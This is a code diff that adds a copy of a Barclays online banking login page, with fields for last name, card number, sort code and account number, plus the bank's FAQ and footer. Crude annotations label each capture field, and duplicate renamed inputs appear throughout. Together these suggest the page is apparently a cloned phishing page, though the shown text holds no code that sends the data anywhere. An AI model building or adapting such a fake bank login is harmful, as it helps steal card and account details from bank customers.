+        <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3">
+          <div class="form-item">
+            <label class="label">
+              <span for="surnameMem" id="label-surnameMem">Last name</span>
+              <label for="surnameMem" id="extraLabelData-surnameMem" class="ng-binding"></label>
+            </label>
+
+            <div class="input-wrapper">
+              <span class="input-prefix"></span>
+              <span class="input-suffix"></span>
+              <!-- LAST NAME -->
+              <input class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameMem" name="lastname2" type="text" maxlength="24" autocomplete="surname" aria-autocomplete="inline">
+
+          </div>
+        </div>
+      </div>
+
+      <div class="membershipNumber"> <!-- THIS IS THE CARD NUMBER INPUT -->
+        <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3">
+          <div class="form-item">
+            <label class="label">
+              <span for="cardnumber">Card number (16 digits)</span>
+              <label for="cardnumber" class="ng-binding"></label>
+            </label>
+
+            <div class="input-wrapper">
+              <span class="input-prefix"></span>
+              <span class="input-suffix"></span>
+              <input aria-labelledby="label-membership0 extraLabelData-membership0" aria-describedby="described-membership0 input-err-1etg2mssp" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="cardnumber" name="cardnumber" type="text">
+            </div>
+          </div>
+        </div>
+      </div>
+    
+  
+</div>
+</ng-form></ng-include></div>
+
+<div id="sortCodeAccountNumber" style="display: none !important;"> <!-- ngInclude: undefined -->
+  <ng-include class="ng-scope">
+    <ng-form id="membershipForm" name="membershipForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-valid">
+      <div class="MemNoInput"> <!-- THIS IS THE LAST NAME INPUT -->
+        <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3">
+          <div class="form-item">
+            <label class="label">
+              <span for="surnameMem" id="label-surnameMem">Last name</span>
+              <label for="surnameMem" id="extraLabelData-surnameMem" class="ng-binding" aria-hidden="true"></label>
+            </label>
+            <!-- LAST NAME -->
+            <input class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameMem" name="lastname3" type="text" maxlength="24" autocomplete="surname" aria-autocomplete="inline">
+          </div>
+        </div>
+      </div>
+
+      <div class="sortCodeInput"> <!-- THIS IS THE SORT CODE INPUT -->
+        <div class="multi-input-container form-item ng-scope ng-pristine ng-invalid ng-invalid-required ng-valid-i-n-p1 ng-valid-i-n-p2" id="sortCode" separator="-" name="sortcode" format="XX-XX-XX" label="Sort code" no-of-inputs="3">
+          <label class="label">
+            <span>Sort code</span>
+          </label>
+
+          <div class="row">
+            <div class="col-xs-4 col-sm-4 col-md-4 col-lg-4 separator-hyphen">
+              <input class="input ng-pristine ng-valid" maxlength="2" type="text" aria-labelledby="sortCode-1" separator="-" format="XX-XX-XX" no-of-inputs="3" name="sortcode1">
+            </div>
+            <div class="col-xs-4 col-sm-4 col-md-4 col-lg-4 separator-hyphen">
+              <span class="sub-label ng-binding" aria-hidden="true"></span>
+              <input class="input ng-pristine ng-valid" maxlength="2" type="text" aria-labelledby="sortCode-1" separator="-" format="XX-XX-XX" no-of-inputs="3" name="sortcode2">
+            </div>
+            <div class="col-xs-4 col-sm-4 col-md-4 col-lg-4 ">
+              <span class="sub-label ng-binding" aria-hidden="true"></span>
+              <input class="input ng-pristine ng-valid" maxlength="2" type="text" aria-labelledby="sortCode-1" separator="-" format="XX-XX-XX" no-of-inputs="3" name="sortcode3">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="accNoInput"> <!-- THIS IS THE ACCOUNT NUMBER INPUT -->
+        <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2">
+          <div class="form-item">
+
+            <label class="label">
+              <span for="accountNumber" id="label-accountNumber">Account number</span>
+              <label for="accountNumber" id="extraLabelData-accountNumber" class="visuallyhidden ng-binding" aria-hidden="true"></label>
+            </label>
+
+            <div class="input-wrapper">
+              <span class="input-prefix"></span>
+              <span class="input-suffix"></span>
+
+              <input ng-attr-tabindex="" aria-labelledby="label-accountNumber extraLabelData-accountNumber" aria-describedby="described-accountNumber input-err-1etg2mstc " class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2" id="accountNumber" name="accountnumber" type="text" maxlength="8">
+            </div>
+          </div>
+        </div>
+      </div>
+    </ng-form>
+  </ng-include>
+</div>
+
+<div class="checkboxWidth"> <b-check id="checkbox1" name="confirmation" ng-model="model.rememberToken" data="rememberMeCheck" arrange="controls-stacked" value-field="value" display-field="displayMobile" aria-label="displayMobile" aria-describedby="value" analytics-tag="" class="ng-isolate-scope ng-pristine ng-valid" dss-dda-component="DDA Specific Component Attribute"><div class="form-item checkbox-element controls-stacked" ng-class="{'has-error':(formController[name].$invalid &amp;&amp; formController[name].$dirty) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid)}" id="b-checkbox-checkbox1">
+  <!-- ngIf: label -->
+  <fieldset>
+    <!-- ngIf: label -->
+    <!-- ngRepeat: (key,item) in scopeData --><label class="control control-checkbox ng-scope last-child first-child" ng-class="{'last-child':$last, 'first-child':$first}" ng-repeat="(key,item) in scopeData">
+      <div class="click-event-container">
+        <input type="checkbox" name="confirmation" value="Y" id="checkbox1_Y" class=" control-input" ng-disabled="ngDisabled" aria-required="false" aria-describedby="b-checkbox-additional-checkbox1-0 checkbox-err-1etg2mssg" tabindex="" ng-checked="isChecked(item[valueField])" ng-click="checkBoxClick($event)">
+        <span id="b-checkbox-span-checkbox1-0" class="control-indicator" aria-hidden="true">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14.01 10" class="icon-tick">
+            <title>Tick</title>
+            <path d="M5.45,8.81.82,5.11a.5.5,0,1,0-.64.76l0,0,5,4a.51.51,0,0,0,.69-.06l8-9a.5.5,0,0,0,0-.7h0a.5.5,0,0,0-.7,0h0Z"></path>
+          </svg>
+        </span>
+        <span class="control-description">
+             <span id="b-checkbox-checkbox1-0" class="ng-binding">Remember my last name and login method.Don't tick the box if you're using a public or shared device</span>
+             <span id="b-checkbox-additional-checkbox1-0">
+                  <!-- ngIf: item.htmlContent -->
+                 <!-- ngIf: !item.htmlContent --><span ng-if="!item.htmlContent" class="additional-text ng-binding ng-scope">
+
+                 </span><!-- end ngIf: !item.htmlContent -->
+             </span>
+        </span>
+      </div>
+    </label><!-- end ngRepeat: (key,item) in scopeData -->
+  </fieldset>
+  <div id="checkbox-err-1etg2mssg">
+    <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; currentState) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; currentState)" class="ng-hide">
+      <!-- ngRepeat: (key, value) in formController[name].$error -->
+    </div>
+    <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; !currentState) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; !currentState)" class="ng-hide">
+      <!-- ngRepeat: (key, value) in formController[name].$error -->
+    </div>
+  </div>
+</div>
+</b-check> </div> </div><!-- end ngIf: mobileView --> <div class="seperator"></div> <div class="marginUpDown"> <button id="continue" class="btn rolbBtn btn btn-primary marginDownMobile" ng-click="submitForm()" name="$$submit" value="Continue" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+    <ng-transclude></ng-transclude>
+    Continue
+</button>
+
+ </div> </div><!-- end ngIf: browser.valid --> </form> </div> </div> </div> </section> </main> <!-- ngIf: faqContent.eligible --><faq ng-if="faqContent.eligible" faq-content="faqContent" class="ng-scope ng-isolate-scope"><aside class="faqBackground"> <div class="container-fluid"> <div class="row"> <div class="col-sm-12 col-lg-12"> <div class="col-md-8 col-md-offset-2 px-0"> <div class="spaceFAQ"> <b-text class="head-color mt-30 ng-isolate-scope" type="h2" b-data="Frequently asked questions" dss-dda-component="DDA Specific Component Attribute"><h2>Frequently asked questions</h2></b-text> </div> <div> <b-accordion name="accordion" data="templates" dss-dda-component="DDA Specific Component Attribute"><ul class="accordion js-accordion accordion-hasjs">
+  <!-- ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_0_1etg2kcqa" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_0_1etg2kcqa" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_0_1etg2kcqa" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_0_1etg2kcqa" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_0_1etg2kcqa" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_0_1etg2kcqa">
+                    <g id="Group-12_0_1etg2kcqa">
+                      <g id="Group-13_0_1etg2kcqa">
+                        <g id="Group-7_0_1etg2kcqa" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_0_1etg2kcqa" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_0_1etg2kcqa" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_0_1etg2kcqa" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">Service status</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_0_1etg2kcqa" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul><li>To check how our services are running and see our planned maintenance, head to <a href=&quot;https://status.uk.barclays/&quot;>status.uk.barclays</a> or type &amp;lsquo;status.barclays&amp;rsquo; into your browser.</li></ul>"><ul class="ng-scope"><li>To check how our services are running and see our planned maintenance, head to <a href="https://status.uk.barclays/">status.uk.barclays</a> or type ‘status.barclays’ into your browser.</li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_1_1etg2kcqa" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_1_1etg2kcqa" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_1_1etg2kcqa" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_1_1etg2kcqa" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_1_1etg2kcqa" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_1_1etg2kcqa">
+                    <g id="Group-12_1_1etg2kcqa">
+                      <g id="Group-13_1_1etg2kcqa">
+                        <g id="Group-7_1_1etg2kcqa" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_1_1etg2kcqa" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_1_1etg2kcqa" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_1_1etg2kcqa" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">Is saving my details safe?</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_1_1etg2kcqa" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul class=&quot;help-content-drawer&quot;>    <li>    <p>If you tick the 'remember me' box, your details will only be retained on the device you're using at the time. That's why we don't recommend you do so on any public or shared devices. This means you don't need to worry about anyone else seeing the details. Even if they do, there isn't enough information there for anyone to access your accounts in Online Banking or any other way.</p>    <p>If you want to save your details, you need to make sure you've switched cookies on for your browser &amp;ndash; that's how the information is stored.</p>    </li></ul>"><ul class="help-content-drawer ng-scope">    <li>    <p>If you tick the 'remember me' box, your details will only be retained on the device you're using at the time. That's why we don't recommend you do so on any public or shared devices. This means you don't need to worry about anyone else seeing the details. Even if they do, there isn't enough information there for anyone to access your accounts in Online Banking or any other way.</p>    <p>If you want to save your details, you need to make sure you've switched cookies on for your browser – that's how the information is stored.</p>    </li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_2_1etg2kcqa" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_2_1etg2kcqa" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_2_1etg2kcqa" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_2_1etg2kcqa" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_2_1etg2kcqa" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_2_1etg2kcqa">
+                    <g id="Group-12_2_1etg2kcqa">
+                      <g id="Group-13_2_1etg2kcqa">
+                        <g id="Group-7_2_1etg2kcqa" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_2_1etg2kcqa" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_2_1etg2kcqa" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_2_1etg2kcqa" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">What does error code 6 mean?</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_2_1etg2kcqa" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul class=&quot;help-content-drawer&quot;>    <li>    <p align=&quot;left&quot;>If you're having problems logging in to Online Banking, you may need to clear your internet browser's cache or update the browser.</p>    <p align=&quot;left&quot;>Below is a guide to clearing the cache for the most common browsers. You can also find the information in your browser's 'help' section.</p>    <br />    <h4 align=&quot;left&quot;><strong>PC users:</strong></h4>    <p align=&quot;left&quot;><strong>Internet Explorer (IE)</strong> &amp;ndash; press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together, then select 'temporary internet files' and click 'delete'</p>    <p align=&quot;left&quot;><strong>Chrome</strong> &amp;ndash; press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together. In the 'clear browsing data window', select 'cached images and files' only, then click 'clear browsing data'</p>    <p align=&quot;left&quot;><strong>Firefox</strong> &amp;ndash; press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together, then select 'clear recent history', select 'cache' only within 'details', then click 'clear now'</p>    <p align=&quot;left&quot;><strong>Safari</strong> &amp;ndash; press <strong>Ctrl, Alt</strong> and the letter <strong>E</strong> together, then select 'empty'</p>    <br />    <h4 align=&quot;left&quot;><strong>Mac users:</strong></h4>    <p align=&quot;left&quot;><strong>Chrome &amp;ndash; Cmd, Shift</strong> and the letter <strong>R</strong> together</p>    <p align=&quot;left&quot;><strong>Firefox &amp;ndash; Cmd, Shift</strong> and the letter <strong>R</strong> together</p>    <p align=&quot;left&quot;><strong>Safari &amp;ndash; Cmd, Alt</strong> button and the letter <strong>E</strong> together</p>    <p align=&quot;left&quot;>To update your browser, please check your browser's help section.</p>    </li></ul>"><ul class="help-content-drawer ng-scope">    <li>    <p align="left">If you're having problems logging in to Online Banking, you may need to clear your internet browser's cache or update the browser.</p>    <p align="left">Below is a guide to clearing the cache for the most common browsers. You can also find the information in your browser's 'help' section.</p>    <br>    <h4 align="left"><strong>PC users:</strong></h4>    <p align="left"><strong>Internet Explorer (IE)</strong> – press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together, then select 'temporary internet files' and click 'delete'</p>    <p align="left"><strong>Chrome</strong> – press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together. In the 'clear browsing data window', select 'cached images and files' only, then click 'clear browsing data'</p>    <p align="left"><strong>Firefox</strong> – press <strong>Ctrl, Shift</strong> and <strong>Delete</strong> together, then select 'clear recent history', select 'cache' only within 'details', then click 'clear now'</p>    <p align="left"><strong>Safari</strong> – press <strong>Ctrl, Alt</strong> and the letter <strong>E</strong> together, then select 'empty'</p>    <br>    <h4 align="left"><strong>Mac users:</strong></h4>    <p align="left"><strong>Chrome – Cmd, Shift</strong> and the letter <strong>R</strong> together</p>    <p align="left"><strong>Firefox – Cmd, Shift</strong> and the letter <strong>R</strong> together</p>    <p align="left"><strong>Safari – Cmd, Alt</strong> button and the letter <strong>E</strong> together</p>    <p align="left">To update your browser, please check your browser's help section.</p>    </li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_3_1etg2kcqa" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_3_1etg2kcqa" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_3_1etg2kcqa" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_3_1etg2kcqa" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_3_1etg2kcqa" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_3_1etg2kcqa">
+                    <g id="Group-12_3_1etg2kcqa">
+                      <g id="Group-13_3_1etg2kcqa">
+                        <g id="Group-7_3_1etg2kcqa" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_3_1etg2kcqa" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_3_1etg2kcqa" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_3_1etg2kcqa" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">How to reset your memorable word and passcode</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_3_1etg2kcqa" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<p>If you need help resetting your memorable word and passcode, you can <a href=&quot;https://www.barclays.co.uk/help/online-banking/login/setup-passcode-word/&quot; target=&quot;_blank&quot; title=&quot;Opens in a new window&quot;>find out how</a> or watch our video.</p>"><p class="ng-scope">If you need help resetting your memorable word and passcode, you can <a href="https://www.barclays.co.uk/help/online-banking/login/setup-passcode-word/" target="_blank" title="Opens in a new window">find out how</a> or watch our video.</p></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_4_1etg2kcqa" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_4_1etg2kcqa" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_4_1etg2kcqa" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_4_1etg2kcqa" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_4_1etg2kcqa" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_4_1etg2kcqa">
+                    <g id="Group-12_4_1etg2kcqa">
+                      <g id="Group-13_4_1etg2kcqa">
+                        <g id="Group-7_4_1etg2kcqa" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_4_1etg2kcqa" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_4_1etg2kcqa" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_4_1etg2kcqa" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">How do I login with Mobile PINsentry?</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_4_1etg2kcqa" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul class=&quot;help-content-drawer&quot;><li><p>If you haven&amp;#39;t logged in to the app, tap the &amp;#39;PINsentry&amp;#39; button in the top left-hand corner of the log-in screen.</p><p>If you&amp;#39;re already logged in, tap the menu icon in the top left-hand corner and then select &amp;#39;Mobile PINsentry&amp;#39; from the list.</p><p>Once you&amp;#39;re on the Mobile PINsentry page, select &amp;#39;Identify&amp;#39; and follow the on-screen instructions.</p><p>Watch our video to find out how to use Mobile PINsentry at <a href=&quot;https://www.barclays.co.uk/help/mobile-banking/pinsentry/info/&quot;>www.barclays.co.uk/help/mobile-banking/pinsentry/info/</a></p></li></ul>"><ul class="help-content-drawer ng-scope"><li><p>If you haven't logged in to the app, tap the 'PINsentry' button in the top left-hand corner of the log-in screen.</p><p>If you're already logged in, tap the menu icon in the top left-hand corner and then select 'Mobile PINsentry' from the list.</p><p>Once you're on the Mobile PINsentry page, select 'Identify' and follow the on-screen instructions.</p><p>Watch our video to find out how to use Mobile PINsentry at <a href="https://www.barclays.co.uk/help/mobile-banking/pinsentry/info/">www.barclays.co.uk/help/mobile-banking/pinsentry/info/</a></p></li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates -->
+</ul></b-accordion> </div> <div class="faqMarginBtn"> <button id="1etg2kcqc" class="btn btn btn-secondary ng-pristine ng-valid" ng-click="needHelp()" ng-model="buttonHelp" name="helpBtn" value="Need more help?" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+    <ng-transclude></ng-transclude>
+    Need more help?
+</button>
+
+ </div> </div> </div> </div> </div> </aside></faq><!-- end ngIf: faqContent.eligible --></div>
+            <!-- ngInclude: undefined --><ng-include src="'https://bank.barclays.co.uk/authlogin/partials/bdlLogin/footer.html?v=1606745934868'" class="ng-scope"> <footer class="ng-scope"> <div class="container-fluid"> <div ng-controller="footerCtrl" class="row footerSpace ng-scope"> <div class="width-MobileGroup col-md-8 col-md-offset-2"> <ul id="footerLinks1" class="mt-29 mb-30 noSpace col-sm-12 col-lg-12 col-xl-12 footer-links"> <!-- ngIf: serviceStatusSwitch --><li id="footerLink" ng-if="serviceStatusSwitch" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1etg2kchb" tabindex="" href="https://status.uk.barclays/" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Service status</span></a> </li><!-- end ngIf: serviceStatusSwitch --> <!-- ngIf: defaultHeader --><li id="footerLink0" ng-if="defaultHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1etg2kchd" tabindex="" href="http://www.barclays.co.uk/Contactus/Contactus/P1242561757335" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Contact us</span></a> </li><!-- end ngIf: defaultHeader --> <!-- ngIf: wealthInternationalHeader --> <!-- ngIf: privateBankHeader --> <!-- ngIf: defaultHeader --><li id="footerLink3" ng-if="defaultHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1etg2kchf" tabindex="" href="http://www.barclays.co.uk/security" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Security</span></a> </li><!-- end ngIf: defaultHeader --> <!-- ngIf: wealthInternationalHeader --> <!-- ngIf: privateBankHeader --> <!-- ngIf: defaultHeader --><li id="footerLink6" ng-if="defaultHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1etg2kchh" tabindex="" href="http://www.barclays.co.uk/accessibility/" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Accessibility</span></a> </li><!-- end ngIf: defaultHeader --> <!-- ngIf: wealthInternationalHeader --> <!-- ngIf: privateBankHeader --> </ul> <div class="space-footerlink"> <b-text id="footerSnippetContent" type="div" b-data="<p><a href=&quot;https://www.barclays.co.uk/important-information/cookies-policy/&quot; target=&quot;_blank&quot; title=&quot;Cookies - updated&quot;>See our cookies policy</a></p>
+<p style=&quot;text-align: left;&quot;>Barclays Bank UK PLC and Barclays Bank PLC are each authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+<p style=&quot;text-align: left;&quot;>Barclays Insurance Services Company Limited and Barclays Investment Solutions Limited are each authorised and regulated by the Financial Conduct Authority.</p>
+<p style=&quot;text-align: left;&quot;>Registered office for all: 1 Churchill Place, London E14 5HP</p>
+<p><a href=&quot; http://www.bsigroup.com/&quot; target=&quot;_blank&quot; title=&quot; http://www.bsigroup.com/&quot;><img alt=&quot;Kite Mark&quot; height=&quot;62&quot; src=&quot;/OLB/A/Content/Images/1321217916907-bsikitemarklogo.png&quot; width=&quot;109&quot; tabindex=&quot;0&quot;></a>&amp;nbsp; &amp;nbsp;&amp;nbsp;<a href=&quot;https://www.iso.org/isoiec-27001-information-security.html&quot; target=&quot;_blank&quot; title=&quot;https://www.iso.org/isoiec-27001-information-security.html&quot;><img alt=&quot;ISO 27001&quot; height=&quot;62&quot; src=&quot;/OLB/A/Content/Images/1321217916492-iso27001footer.JPG&quot; width=&quot;107&quot; tabindex=&quot;0&quot;></a>&amp;nbsp; &amp;nbsp;<a href=&quot;https://www.barclays.co.uk/digisafe/&quot; target=&quot;_blank&quot; title=&quot;https://www.barclays.co.uk/digisafe/&quot;><img alt=&quot;Cyber Essentials&quot; height=&quot;50&quot; src=&quot;/OLB/A/Content/Images/1321217918424-cyberfooter.jpg&quot; width=&quot;69&quot; tabindex=&quot;0&quot;></a>&amp;nbsp; <a href=&quot;https://www.fscs.org.uk/&quot; target=&quot;_blank&quot; title=&quot;https://www.fscs.org.uk/&quot;><img alt=&quot;Financial Services Compensation Scheme&quot; height=&quot;62&quot; src=&quot;/OLB/A/Content/Images/login-fscs.png&quot; width=&quot;54&quot; tabindex=&quot;0&quot;><br>
+<br>
+ <br>
+ </a></p>" class="ng-isolate-scope" dss-dda-component="DDA Specific Component Attribute"><div><p><a href="https://www.barclays.co.uk/important-information/cookies-policy/" target="_blank" title="Cookies - updated">See our cookies policy</a></p>
+<p style="text-align: left;">Barclays Bank UK PLC and Barclays Bank PLC are each authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+<p style="text-align: left;">Barclays Insurance Services Company Limited and Barclays Investment Solutions Limited are each authorised and regulated by the Financial Conduct Authority.</p>
+<p style="text-align: left;">Registered office for all: 1 Churchill Place, London E14 5HP</p>
